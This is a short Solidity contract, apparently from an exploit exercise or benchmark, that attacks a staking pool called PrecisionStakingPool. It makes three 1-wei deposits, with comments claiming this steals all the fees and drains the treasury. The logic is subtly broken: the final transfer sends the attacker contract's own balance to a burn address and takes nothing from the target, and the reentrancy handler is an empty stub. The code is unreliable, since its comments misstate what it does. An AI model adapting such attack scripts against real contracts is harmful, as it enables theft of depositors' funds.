// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {PrecisionStakingPool} from "../src/PrecisionStakingPool.sol";

contract ExploitModule {
    PrecisionStakingPool public targetContract;

    constructor(address _target) payable {
        targetContract = PrecisionStakingPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit 1 wei to get 1 share, which means we can steal all the fees
        targetContract.depositWithFee{value: 1}();
        targetContract.depositWithFee{value: 1}();
        targetContract.depositWithFee{value: 1}();

        // Drain the treasury
        payable(address(0xdead)).transfer(address(targetContract).balance);
    }

    receive() external payable {
        // Reentrancy / callback handling if applicable
    }
}